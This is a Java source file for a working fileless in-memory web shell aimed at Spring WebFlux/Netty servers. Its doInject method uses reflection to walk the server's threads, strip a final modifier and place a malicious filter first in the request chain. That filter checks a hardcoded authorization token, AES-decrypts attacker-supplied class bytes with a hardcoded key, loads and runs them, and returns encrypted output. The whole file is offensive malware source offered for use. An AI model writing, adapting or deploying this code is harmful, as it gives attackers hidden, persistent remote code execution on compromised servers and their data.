package hello;

import org.springframework.boot.web.embedded.netty.NettyWebServer;
import org.springframework.core.io.buffer.DefaultDataBufferFactory;
import org.springframework.http.HttpHeaders;
import org.springframework.http.server.reactive.ReactorHttpHandlerAdapter;
import org.springframework.util.MultiValueMap;
import org.springframework.web.server.ServerWebExchange;
import org.springframework.web.server.WebFilter;
import org.springframework.web.server.WebFilterChain;
import org.springframework.web.server.WebHandler;
import org.springframework.web.server.adapter.HttpWebHandlerAdapter;
import org.springframework.web.server.handler.DefaultWebFilterChain;
import org.springframework.web.server.handler.ExceptionHandlingWebHandler;
import org.springframework.web.server.handler.FilteringWebHandler;
import reactor.core.publisher.Mono;

import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.lang.reflect.Modifier;
import java.net.URL;
import java.net.URLClassLoader;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class FilterMemshellPro implements WebFilter {

    public static Map<String, Object> store = new HashMap<>();
    public static String pass = "pass";
    public static String xc = "3c6e0b8a9c15224a";
    public static String auth = "4FQi7T6u6uUqFPRo";
    public static String md5;

    public static String doInject() {
        String msg = "Inject MemShell Failed";
        Method getThreads = null;
        try {
            getThreads = Thread.class.getDeclaredMethod("getThreads");
            getThreads.setAccessible(true);
            Object threads = getThreads.invoke(null);
            for (int i = 0; i < Array.getLength(threads); i++) {
                Object thread = Array.get(threads, i);
                if (thread != null && thread.getClass().getName().contains("NettyWebServer")) {
                    // 获取defaultWebFilterChain
                    NettyWebServer nettyWebServer = (NettyWebServer) getFieldValue(thread, "this$0",false);
                    ReactorHttpHandlerAdapter reactorHttpHandlerAdapter = (ReactorHttpHandlerAdapter) getFieldValue(nettyWebServer, "handler",false);
                    Object delayedInitializationHttpHandler = getFieldValue(reactorHttpHandlerAdapter,"httpHandler",false);
                    HttpWebHandlerAdapter httpWebHandlerAdapter= (HttpWebHandlerAdapter)getFieldValue(delayedInitializationHttpHandler,"delegate",false);
                    ExceptionHandlingWebHandler exceptionHandlingWebHandler= (ExceptionHandlingWebHandler)getFieldValue(httpWebHandlerAdapter,"delegate",true);
                    FilteringWebHandler filteringWebHandler = (FilteringWebHandler)getFieldValue(exceptionHandlingWebHandler,"delegate",true);
                    DefaultWebFilterChain defaultWebFilterChain= (DefaultWebFilterChain)getFieldValue(filteringWebHandler,"chain",false);
                    // 构造新的Chain进行替换
                    Object handler= getFieldValue(defaultWebFilterChain,"handler",false);
                    List<WebFilter> newAllFilters= new ArrayList<>(defaultWebFilterChain.getFilters());
                    newAllFilters.add(0,new FilterMemshellPro());// 链的遍历顺序即"优先级"，因此添加到首位
                    DefaultWebFilterChain newChain = new DefaultWebFilterChain((WebHandler) handler, newAllFilters);
                    Field f = filteringWebHandler.getClass().getDeclaredField("chain");
                    f.setAccessible(true);
                    Field modifersField = Field.class.getDeclaredField("modifiers");
                    modifersField.setAccessible(true);
                    modifersField.setInt(f, f.getModifiers() & ~Modifier.FINAL);// 去掉final修饰符以重新set
                    f.set(filteringWebHandler,newChain);
                    modifersField.setInt(f, f.getModifiers() & Modifier.FINAL);
                    msg = "Inject MemShell Successful";
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return msg;
    }
    public static Object getFieldValue(Object obj, String fieldName,boolean superClass) throws Exception {
        Field f;
        if(superClass){
            f = obj.getClass().getSuperclass().getDeclaredField(fieldName);
        }else {
            f = obj.getClass().getDeclaredField(fieldName);
        }
        f.setAccessible(true);
        return f.get(obj);
    }

    private static Class defineClass(byte[] classbytes) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);
        return (Class) method.invoke(urlClassLoader, classbytes, 0, classbytes.length);
    }

    public static byte[] x(byte[] s, boolean m) {
        try {
            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            java.security.MessageDigest m;
            m = java.security.MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
        } catch (Exception e) {
        }
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        Class base64;
        String value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String) Encoder.getClass().getMethod("encodeToString", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String) Encoder.getClass().getMethod("encode", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        Class base64;
        byte[] value = null;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[]) decoder.getClass().getMethod("decode", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
        } catch (Exception e) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", new Class[]{String.class}).invoke(decoder, new Object[]{bs});
            } catch (Exception e2) {
            }
        }
        return value;
    }

    @Override
    public Mono<Void> filter(ServerWebExchange exchange, WebFilterChain chain) {
        String authorizationHeader = exchange.getRequest().getHeaders().getFirst(HttpHeaders.AUTHORIZATION);
        if(authorizationHeader != null && authorizationHeader.equals(auth)) {
            md5 = md5(pass + xc);
            Mono<MultiValueMap<String, String>> formData = exchange.getFormData();
            Mono bufferStream = formData.flatMap(map -> {
                String passStr = map.getFirst(pass);
                StringBuilder result = new StringBuilder();
                try {
                    byte[] data = x(base64Decode(passStr), false);
                    if (store.get("payload") == null) {
                        store.put("payload", defineClass(data));
                    } else {
                        store.put("parameters", data);
                        java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();
                        Object f = ((Class) store.get("payload")).newInstance();
                        f.equals(arrOut);
                        f.equals(data);
                        result.append(md5.substring(0, 16));
                        f.toString();
                        result.append(base64Encode(x(arrOut.toByteArray(), true)));
                        result.append(md5.substring(16));
                    }
                } catch (Exception ex) {
                    result.append(ex.getMessage());
                }
                return Mono.just(new DefaultDataBufferFactory().wrap(result.toString().getBytes(StandardCharsets.UTF_8)));
            });
            return exchange.getResponse().writeWith(bufferStream);
        }
        return chain.filter(exchange);
    }
}

